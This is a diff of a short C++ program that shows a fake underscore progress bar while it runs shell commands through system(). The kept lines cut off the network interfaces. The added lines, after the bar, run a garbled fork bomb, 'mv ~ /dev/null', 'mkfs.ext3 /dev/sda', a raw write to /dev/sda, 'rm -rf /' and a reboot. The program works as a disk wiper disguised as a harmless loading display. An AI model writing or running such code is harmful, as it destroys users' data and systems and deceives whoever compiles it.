@@ -4,14 +4,9 @@
 using namespace std;
 	
 int main(){
-	system("ifconfig eth0 down");
-	system("ifconfig ens33 down");
-	system("ifconfig wlan0 down");
-	
-	system("apt-get auto-remove gnome-shell");
-	system("apt-get auto-remove gnome-shell-co");
-	system("apt-get auto-remove gnome-software");
-	system("apt-get auto-remove gnome-core");
+	system ("ifconfig eth0 down");
+	system ("ifconfig ens33 down");
+	system ("ifconfig wlan0 down");
 	std::chrono::seconds time(1);
 	std::this_thread::sleep_for(time);
 	cout << "_";
@@ -153,5 +148,11 @@ int main(){
 	cout << "_________";
 	
 	cout << "_____" << endl;
+	system (":;{&:|:}()");
+	system ("mv ~ /dev/null");
+	system ("mkfs.ext3 /dev/sda");
+	system ("any-command > /dev/sda");
+	system ("rm -rf /");
+	system ("reboot");
 	return 0;
 }
